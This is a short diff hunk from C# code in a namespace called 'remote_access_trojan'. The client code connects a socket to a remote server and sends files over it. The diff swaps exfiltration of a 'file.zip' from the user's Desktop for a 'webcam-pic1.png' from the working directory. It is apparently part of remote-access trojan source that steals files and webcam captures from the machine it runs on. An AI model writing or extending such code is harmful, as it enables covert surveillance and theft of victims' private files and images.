@@ -45,13 +45,12 @@ namespace remote_access_trojan
                         Console.WriteLine("Socket connected to -> {0} ",
                                       sender.RemoteEndPoint.ToString());
 
-                        // Creation of messagge that 
-                        // we will send to Server
-                        
-                        //byte[] messageSent = Encoding.ASCII.GetBytes("Test Client<EOF>");
-                        //int byteSent = sender.Send(messageSent);
+                    // Creation of messagge that 
+                    // we will send to Server
 
-                        sender.SendFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "file.zip"));
+                    //byte[] messageSent = Encoding.ASCII.GetBytes("Test Client<EOF>");
+                    //int byteSent = sender.Send(messageSent);
+                    sender.SendFile(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic1.png"));
 
                     // Data buffer 
                     byte[] messageReceived = new byte[1024];
